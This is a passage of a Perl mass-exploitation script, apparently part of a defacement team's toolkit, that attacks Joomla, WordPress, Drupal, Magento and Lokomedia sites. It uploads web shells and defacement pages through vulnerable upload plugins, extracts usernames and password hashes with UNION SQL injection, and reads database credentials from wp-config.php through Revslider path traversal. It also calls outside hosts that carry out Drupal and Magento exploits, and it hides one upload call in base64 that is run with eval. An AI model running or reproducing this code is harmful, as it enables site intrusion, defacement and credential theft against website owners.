close (TEXT);
}else{
print color('bold white'),"[Com Weblinks]";
print color('bold white')," ....................... ";
print color('bold red'),"[Failed]\n";
}
}
################ mod_simplefileupload #####################
sub mod_simplefileupload(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);

$url ="$site/modules/mod_simplefileuploadv1.3/elements/udd.php";
$simplefileuploadsup= "$site/modules/mod_simplefileuploadv1.3/elements/XBazooka.php?X=Bazooka";

my $shell ="XBazooka.php";

my $response = $ua->post( $url, Content_Type => "multipart/form-data", Content => [ file=>["$shell"] , submit=>"Upload" ]);

$check = $ua->get($simplefileuploadsup)->content;
if ($check =~ /X Bazooka/){
print color('bold white'),"[mod_simplefileupload]";
print color('bold white')," ............... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $simplefileuploadsup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$simplefileuploadsup\n";
close (TEXT);
}else{
print color('bold white'),"[mod_simplefileupload]";
print color('bold white')," ............... ";
print color('bold red'),"[Failed]\n";
}
}

################ lokomedia #####################
sub lokomedia(){
$lokoversion = "$site/statis--7'union select /*!50000Concat*/(Version())+from+users--+--+kantordesa.html";
$lokodatabase = "$site/statis--7'union select /*!50000Concat*/(Database())+from+users--+--+kantordesa.html";
$lokouserdata = "$site/statis--7'union select /*!50000Concat*/(USER())+from+users--+--+kantordesa.html";
$lokouser = "$site/statis--7'union select /*!50000Concat*/(username)+from+users--+--+kantordesa.html";
$lokopass = "$site/statis--7'union select /*!50000Concat*/(password)+from+users--+--+kantordesa.html";

my $checklokoversion = $ua->get("$lokoversion")->content;
if($checklokoversion =~/<meta name="description" content="(.*)">/) {
$dbv=$1;

if($dbv =~ /[a-z]/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," MySQL Version : $dbv\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\n[ DATABASE ]\n";
print TEXT "$site";
print TEXT "\nMySQL Version : $dbv";
close (TEXT);
my $checklokodatabase = $ua->get("$lokodatabase")->content;
if($checklokodatabase =~/<meta name="description" content="(.*)">/) {
$db=$1;
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," Current Database : $db\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nCurrent Database : $db";
close (TEXT);
}
my $checklokouserdata = $ua->get("$lokouserdata")->content;
if($checklokouserdata =~/<meta name="description" content="(.*)">/) {
$udb=$1;
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," Current Username : $udb\n";
}
my $checklokouser = $ua->get("$lokouser")->content;
if($checklokouser =~/<meta name="description" content="(.*)">/) {
$user=$1;
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," Username : $user\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nUsername : $user";
close (TEXT);
}
my $checklokopass = $ua->get("$lokopass")->content;
if($checklokopass =~/<meta name="description" content="(.*)">/) {
$hash=$1;
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," Hash Pass : $hash\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nHash Pass : $hash";
close (TEXT);
lokohash();
lokopanel();
}
}
}
}
sub lokohash(){
if ($hash =~ /a66abb5684c45962d887564f08346e8d/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : admin123456\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : admin123456";
close (TEXT);
}
elsif ($hash =~ /0192023a7bbd73250516f069df18b500/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : admin123\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : admin123";
close (TEXT);
}
elsif ($hash =~ /73acd9a5972130b75066c82595a1fae3/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : ADMIN\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : ADMIN";
close (TEXT);
}
elsif ($hash =~ /7b7bc2512ee1fedcd76bdc68926d4f7b/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : Administrator\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : Administrator";
close (TEXT);
}
elsif ($hash =~ /c21f969b5f03d33d43e04f8f136e7682/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : default\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : default";
close (TEXT);
}
elsif ($hash =~ /1a1dc91c907325c69271ddf0c944bc72/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : pass\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : pass";
close (TEXT);
}
elsif ($hash =~ /5f4dcc3b5aa765d61d8327deb882cf99/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : password\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : password";
close (TEXT);
}
elsif ($hash =~ /098f6bcd4621d373cade4e832627b4f6/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : test\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : test";
close (TEXT);
}
elsif ($hash =~ /21232f297a57a5a743894a0e4a801fc3/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : admin\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : admin";
close (TEXT);
}
elsif ($hash =~ /fe01ce2a7fbac8fafaed7c982a04e229/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : demo\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : demo";
close (TEXT);
}
else{
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : ";
print color('bold red'),"NOt FOUND\n";
}
}

sub lokopanel(){
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);
$pathone = "$site/redaktur";
my $lokomediacms = $ua->get("$pathone")->content;
if($lokomediapathone =~/administrator|username|password/) {
  print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Admin Panel : ";
print color('bold green'),"Found!\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"URL : $pathone\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nURL : $pathone";
close (TEXT);
}
else{
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Admin Panel : ";
print color('bold red'),"NOt FOUND\n";
}
}

####################################################################################################################
####################################################################################################################
######################################### DRUPAL  ##################################################################
####################################################################################################################
sub fuckdrupal(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);

# check the link of the exploit or you can download script from here : http://pastebin.com/wPAbtyJ4 and you upload it on you one shell :) 
$drupalink = "http://www.bircinar.de/wp-includes/drup.php";
my $exploit = "$drupalink?url=$site&submit=submit";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/Success!/) {
print colored ("[DRUPAL EXPLOIT]",'white on_red');
print " ............... ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

print "[WAIT I WILL MAKE SURE ABOUT USER AND PASSWORD]\n";
# // here to test the user name and the password if the website has been really fucked or not :p
$admin ="mahfoud";
$pass  ="admin";
$wp = $site . '/user/login';
$red = $site . '/user/1';
print "$wp\n";

$brute = POST $wp, [name => $admin, pass => $pass, form_build_id =>'', form_id => 'user_login',op => 'Log in', location => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
    if ($stat =~ /302/){
print colored ("[BOOM] $site => User | $admin Password | $pass",'white on_yellow'),"\n";
    open(save, '>>Result/Drupal.txt');
    print save "Success Mah ! $site | username : mahfoud | pass: admin\n";
    close(save);
    }
    elsif ($stat =~ /404/){
    print "[NOT DRUPAL] .................. [Failed]\n";
    }
}else{
# // here to test user: admin and password : admin on the panel admin 
print "[TRYING WITH USER AND PASSWORD ADMIN]\n"; 
$admin="admin";
$pass ="admin";
$dr = $site . '/user/login';
$brute = POST $dr, [name => $admin, pass => $pass, form_build_id =>'', form_id => 'user_login',op => 'Log in'];
$response = $ua->request($brute);
$stat = $response->status_line;
    if ($stat =~ /302/){

print colored ("[BOOM] $site=> User | $admin Password | $pass",'white on_yellow'),"\n";

    open(save, '>>Result/Drupal.txt');
    
    print save "Success Mah ! $site | username : $admin | pass: $pass\n";
    
    close(save);
    }else{
print "[DRUPAL] ...................... ";
print color('bold red');
print "[";
print color('reset');
print color('bold red');
print "Failed";
print color('reset');
print color('bold red');
print "] \n";
print color('reset');

        }
    
}
}
######################
######################
######################
###### magento ########
######################
######################
######################
sub magento(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
print color('bold white'),"[Magento] ............................ ";


$magentoxlink = "http://www.bircinar.de/wp-includes/mag.php";
my $exploitspymag = "$magentoxlink?url=$site&submit=submit";
my $checkksbir = $ua->get("$exploitspymag")->content;
if($checkksbir =~/Success /) {

    print color('bold green');
print "[Success]\n";
    print color('reset');
    open(save, '>>Result/Brute.txt');
    print save "[Magento] $site hydra|hydra77\n";
    close(save);
    }
else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');


        }

}



####################################################################################################
####################################################################################################
######################################COM users##############################################
####################################################################################################
####################################################################################################
sub comusers(){

my $url = "$site/index.php?option=com_users&view=registration";
my $checkomusers = $ua->get("$url")->content;
if($checkomusers =~/jform_email2-lbl/) {
print color('bold white'),"[Com Users]";
print color('bold white')," ........................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"* Exploit It It Manual\n";
    open(save, '>>Result/vulntargets.txt');   
    print save "[Com Users] $site\n";   
    close(save);
}else{
print color('bold white'),"[Com Users]";
print color('bold white')," .......................... ";
print color('bold red'),"[Failed]\n";
    }
}


####################################################################################################
####################################################################################################
############################# COM BLOG SCANNER    ##################################################
####################################################################################################
####################################################################################################
sub comblog(){
    print color('bold white'), "[COM BLOG SCANNER]";


$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (10);

my $exploitblog = "$site/index.php?option=com_myblog&task=ajaxupload";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~/has been uploaded/) {
    print ".................... ";
print "[VULN]";
print "\n";
    open(save, '>>Result/vulntargets.txt');   
    print save "blog $site\n";   
    close(save);

print " $site EXPLOIT IT MANUEL \n";
    }
    else {print ".................... ";
	 print color('bold red');
print "[Failed]";
print "\n";

}
}

####################################################################################################
###### Com_sexy ####
sub com_sexy(){  print color('bold white'),"[Com sexy Scanner ] .................. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (10);
my $exploitblog = "$site/components/com_sexycontactform/fileupload/index.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~/Content/) {
   print color('bold green');
   print "[Success] ";
    print color('reset');
open(BEN,">>Result/com_sexy.txt");
print BEN "$target\n";
close(BEN);
}else{
   print color('bold red');
   print "[Failed]";
   print color('reset');
    }}

####################################################################################################

#####################
######################
######################
######################
###### jce shell #####
######################
######################
######################
sub jceshell(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
print color('bold white'),"[jce Upload Shell] ................... ";


$drupalink = "http://localhost/jce.php";
my $exploit = "$drupalink?url=$site&submit=submit";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/success/) {

    print color('bold green');
print "[Success]\n";
    print color('reset');
print "$site => User | $admin Password | $pass\n ";
    open(save, '>>Result/Shell3z.txt');
    print save "$site/images/stories/mahfoud.php\n";
    close(save);
    }
else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');


        }

}
#####################




sub formcraft(){
print color('bold white'),"[FormCraft Upload] ................... ";

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
$link = $site."/wp-content/plugins/formcraft/file-upload/server/php/";
my $conte = $ua->get("$link")->content;
if ($conte =~/{"files"/){
   
    upform();
}else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');

}

}

sub upform(){
{
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
my $picture ="xx.php"; 
my $field_name = "files[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$picture"] ]
           
            );
$upzzspy = $site. '/wp-content/plugins/formcraft/file-upload/server/php/files/xx.php'; 
my $taz = $ua->get("$upzzspy")->content;
if ($taz =~ /Wissem Mahfoud/){
   print color('bold green');
print "[Success]\n";
print color('reset');

open(save, '>>Result/Shell3z.txt');   
print save "$upzzspy\n";   
close(save);
}else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');}
}

}





######################
######################
######################
###### Jce Img #######
######################
######################
######################




  sub comjce(){
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);


$exploiturl="/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

$vulnurl=$site.$exploiturl;
$res = $ua->get($vulnurl)->content;
print color('bold white'),"[JCE Image Upload] ................... ";


if ($res =~ m/No function call specified!/i){
my $res = $ua->post($vulnurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => ["RBJ/mah.gif"],
        'action' => 'upload'
        ]
    )->decoded_content;
if ($res =~ m/"error":false/i){

}else{
    print color('bold red');
print "[Failed]\n ";
    print color('reset');


}

$remote = IO::Socket::INET->new(
        Proto=>'tcp',
        PeerAddr=>"$site",
        PeerPort=>80,
        Timeout=>15
        );
$def= "$site/mah.gif";
$check = $ua->get($def)->status_line;
if ($check =~ /200/){
    open(save, '>>Result/index.txt');
    print save "[Defaced JCE] $def\n";
    close(save);
    print color('bold green');
	print "[Success]\n";
    print color('reset');
zoneh();



}

}
else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');

}
    }

	
####################################################################################################
####################################################################################################
########################################## COM ADS ANAGER ##########################################
####################################################################################################
####################################################################################################
sub comadsmanegr(){
    print color('bold white'),"[COM ADS MANAGER]";
my $path = "/index.php?option=com_adsmanager&task=upload&tmpl=component";
if($site !~ /http:\/\//) { $target = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["mah1.jpg"], name => "done.html"]);
if ($exploit->decoded_content =~ /done.html/) {
    print "............................ [VULN] \n";
        open(save, '>>Result/vulntargets.txt');   
    print save "adsmanager $site\n";   
    close(save);

    print "[UPLOAD INDEX] ......................... ";
print "OK";
print "\n";

    $def="$site/tmp/plupload/done.html";
my $checkdef = $ua->get("$def")->content;
if($checkdef =~/Hacked|By|Wissem|Mahfoud/) {
    print "[DEFACE] .......................... ";
print "SUCCESS";
print "\n";
print "INDEX LINK => $def\n";
    zoneh();
    mirrorzon();
    adshell();
    }
}else
{print ".......................... ";
print "[Failed]";
print "\n";
}
}




sub adshell(){

        print "[UPLOAD SHELL] .......................... ";
my $path = "/index.php?option=com_adsmanager&task=upload&tmpl=component";
my $exploitxx = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["loader.jpg"], name => "Wiss.php"]);
if ($exploitxx->decoded_content =~ /Wiss.php/) {
print "OK";
print "\n";
print "[SCANING SHELL] .......................... ";
print "WAIT";
print "\n";

my $check = $ua->get("$site/tmp/plupload/Wiss.php")->content;
my $checkk = $ua->get("$site/Wiss.php")->content;
if($checkk =~/<form method=post>Password: <input type=password name=pass><input type=submit value=/) {
print "SHELL .......................... ";           
print "[SUCCESS]";
print "\n";
print "SHELL LINK => $site/Wiss.php\n";
    open(save, '>>Result/shells.txt');
    print save "adsmanager $site/Wiss.php\n";
    close(save);
    my $checkjo = $ua->get("$site/un.php")->content;
if($checkjo =~ /path:(.*)<b><br>uname:(.*)<br><\/b>mah/){
    print "\n";
print "PATH : $1","\n\n";
print "KERNEL:$2","\n";
print "\n";
    open(save, '>>Result/shells.txt');
    
    print save "Path : $1\nKernel:$2\n";
    
    close(save);
}
}else{
  print "SHELL .......................... ";            
print "[Failed]";
print "\n";
}

}	
################ Com Media #####################
sub comedia(){
my $url = "$site/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";
my $index ="Bazouka.txt";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$index"] ]
           
            );

$mediaup="$site/images/Bazouka.txt";

$checkpofwup = $ua->get("$mediaup")->content;
if($checkpofwup =~/HaCKeD/) {
print color('bold white'),"[Com Media]";
print color('bold white')," .......................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold white'),"  [Link] => $mediaup\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$mediaup\n";
close (TEXT);
}else{

print color('bold white'),"[Com Media]";
print color('bold white')," .......................... ";
print color('bold red'),"[Failed]\n";
}
}
}
######################

######################
######################
######################
###### Media #######
######################
######################
######################

sub comediaindex(){
print color('bold white'),"[Com Media Index] .................... ";

$filemedia = "RBJ/mah.txt";
$indexmedia="$site/images/mah.txt";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$sorm = $ua->get($tarmedia);
$karza = $sorm->content;
if($karza =~/<form action="(.*?)" id=\"uploadForm\" class=\"form-horizontal\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ || $karza =~ /<form action="(.*?)" id=\"uploadForm\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ )
{
$url = $1;
$url =~ s/&amp;/&/gi;
    my $res = $ua->post($url, Content_Type => 'form-data', Content => [ Filedata => [$filemedia] ]);
 my $check = $ua->get("$indexmedia")->content;
 {
 print color('bold green'), " *Success Defaced \n ";

        open (TEXT, '>>Result/index.txt');
        print TEXT "[ COM MEDIA Index] => $indexmedia \n";
        close (TEXT);


        $def = $indexmedia;
    zoneh();
        }
    } else{
    print color('bold red');
print "[Failed]\n";
    print color('reset');
        }
}

######################
######################
######################
##### Jdownload ######
######################
######################
######################

    sub comjdowloads($site){
print color('bold white'),"[comjdowloads Upload] ................ ";


$file="RBJ/bazooka.rar";
$filez="RBJ/mah.php.php.j";
$jdup= $site . 'index.php?option=com_jdownloads&Itemid=0&view=upload';
$shellpath= $site . '/images/jdownloads/screenshots/mah.php.j';

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Wissem Mahfoud", mail=>"spinningarrix@gmail.com", filetitle =>"Fallaga Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);

if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {
 

my $checkshell = $ua->get("$shellpath")->content;
if($checkshell =~/Wissem Mahfoud/) {
    print color('bold green');
print "[Sucess]\n";
    print color('reset');        open (TEXT, '>>Result/Shell3z.txt');
        print TEXT "[ JDWN SHELL] => $shellpath\n";
        close (TEXT);
}

}else{
    print color('bold red');
print "[Failed]\n";
    print color('reset');
}


print color('bold white'),"[comjdowloads Index ] ................ ";

$def = $site . '/images/jdownloads/screenshots/mah.html.j';
$filee="RBJ/bazooka.rar";
$filezz="RBJ/mah.html.j";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Wissem Mahfoud", mail=>"spinningarrix@gmail.com", filetitle =>"Fallaga Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {


my $response = $ua->get("$def")->status_line;
if ($response =~ /200/){
    print color('bold green');
print "[Success]\n";
    print color('reset');

        open (TEXT, '>>Result/index.txt');
        print TEXT "[ JDWN Index] => $def\n";
        close (TEXT);

zoneh();
}else{
    print color('bold red');
print "[Failed]\n";
    print color('reset');
        }
}
else{
    print color('bold red');
print "[Failed]\n";
    print color('reset');

}

    }


####################################################################################################
####################################################################################################
########################################## COM ADS ANAGER ##########################################
####################################################################################################
####################################################################################################
sub comadsmanegr(){
print color('bold white'),"[Com Ads Manger ] .................... ";

my $path = "/index.php?option=com_adsmanager&task=upload&tmpl=component";
if($site !~ /http:\/\//) { $target = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["ak47.jpg"], name => "baz.html"]);
if ($exploit->decoded_content =~ /baz.html/) {
        open(save, '>>Result/index.txt');   
    print save "[ads] $site\n";   
    close(save);

    $def="$site/tmp/plupload/baz.html";
my $checkdef = $ua->get("$def")->content;
if($checkdef =~/Wissem Mahfoud/) {
    print "[Success]\n ";

    zoneh();
    }
}else{
    print color('bold red');
print "[Failed]\n";
    print color('reset');

;
}
}





####################
#mode exploit ######
####################
   sub mods($site){
print color('bold white'),"[mod_simplefileupload ] .............. ";

my $gh = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$gh->timeout(10);
$gh->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
   
   
$file="mds_bazooka.php";
$jdup= $site . '/modules/mod_simplefileuploadv1.3/elements/udd.php';
$shell= $site . '/modules/mod_simplefileuploadv1.3/elements/mds_bazooka.php';



my $exploit = eval(decode_base64('JGdoLT5wb3N0KCIkamR1cCIsIENvbnRlbnRfVHlwZSA9PiAibXVsdGlwYXJ0L2Zvcm0tZGF0YSIsIENvbnRlbnQgPT4gWyBmaWxlPT5bIiRmaWxlIl0gLCBzdWJtaXQ9PiJVcGxvYWQiIF0pOw=='));


my $check = $gh->get("$shell")->content;
if($check =~/Wissem Mahfoud/) {
    print color('bold green');
print "[Success]\n";
    print color('reset');
        open (TEXT, '>>Result/Shell3z.txt');
        print TEXT "[ Shell LINK ] => $site/cloudbazooka.php\n";
        close (TEXT);
		        open (TEXT, '>>Result/index.txt');
		        print TEXT "[ Deface Link LINK ] => $site/baz.html\n";
        close (TEXT);

		$def =$site .'/baz.html';
zoneh();

}
else
{
    print color('bold red');
print "[Failed]\n";
    print color('reset');
}


}

############################################ wysija #################################################
####################################################################################################
sub wysija(){
print colored("[Wysija] ",'white');

$zokometheme = "my-theme";
my $path = "/wp-admin/admin-post.php?page=wysija_campaigns&action=themes";
if($site !~ /http:\/\//) { $site = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");


my $exploit = $ua->post("$site/$path", Content_Type => 'form-data', Content => [ $zokometheme => ['bazooka.zip', => 'bazooka.zip'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);

my $check = $ua->get("$site/wp-content/uploads/wysija/themes/Mahfoud/herewgo.php")->content;
my $checkk = $ua->get("$site/404.php")->content;
if($checkk =~/<form method=post>Password: <input type=password name=pass><input type=submit value=/) {
        open(save, '>>Result/vulntargets.txt');   
    print save "[wysija] $site\n";   
    close(save);
print" .............................. ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "OK";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

print "[UPLOADING SHELL] ...........";

print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "SUCCESS";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
print "[SHELL LINK] => $site/404.php\n";
    open(save, '>>Result/shells.txt');  
    print save "[WYSIJA] $site/404.php\n"; 
    close(save);
my $checkgasss = $ua->get("$site/un.php")->content;
if($checkgasss =~ /path:(.*)<b><br>uname:(.*)<br><\/b>fallagateam/){
    print "\n";
print colored ("[PATH] : $1",'black on_yellow'),"\n\n";
print colored ("[KERNEL]:$2",'black on_yellow'),"\n";
print "\n";
    open(save, '>>Result/shells.txt');
    
    print save "Path : $1\nKernel:$2\n";
    
    close(save);
}
$def="$site/Mah.html";
my $fuckingcheck = $ua->get("$def")->content;
    if($fuckingcheck =~m/Fallag|Hacked/i) {
                    zoneh();
                    mirrorzon();
}




}else {
    print" ............................ ";

print color('bold red');
print "[";
print color('reset');
print color('bold RED');
print "Failed";
print color('reset');
print color('bold red');
print "] \n";
print color('reset');
}
}





######################
######################
######################
###### Revslider #####
######################
######################
######################
sub getconfig{
print color('bold white'), "[Revslider Config] ................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$config = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
$conflink = "$site/$config";
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold green');
print "[Sucess]\n";
    print color('reset');
    print save "[rev cnfg] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$cont = $resp->content;
while($cont =~ m/DB_NAME/g){


        if ($cont =~ /DB_NAME\', \'(.*)\'\)/){
        print "\t[-]Database Name = $1 \n";
print color 'reset';
        open (TEXT, '>>Result/config.txt');
        print TEXT "\n[ DATABASE ] \n$site\n[-]Database Name = $1";
        close (TEXT);
        }
        if ($cont =~ /DB_USER\', \'(.*)\'\)/){
        print "\t[-]Database User = $1 \n";
print color 'reset';
        open (TEXT, '>>Result/config.txt');
        print TEXT "\n[-]Database User = $1";
        close (TEXT)
        }
        if ($cont =~ /DB_PASSWORD\', \'(.*)\'\)/){
        print "\t[-]Database Password = $1 \n";
print color 'reset';
        $pass= $1 ;
        open (TEXT, '>>Result/config.txt');
        print TEXT "\nDatabase Password = $pass";
        close (TEXT)
        }
        if ($cont =~ /DB_HOST\', \'(.*)\'\)/){
        print "\t[-]Database Host = $1 \n\n";
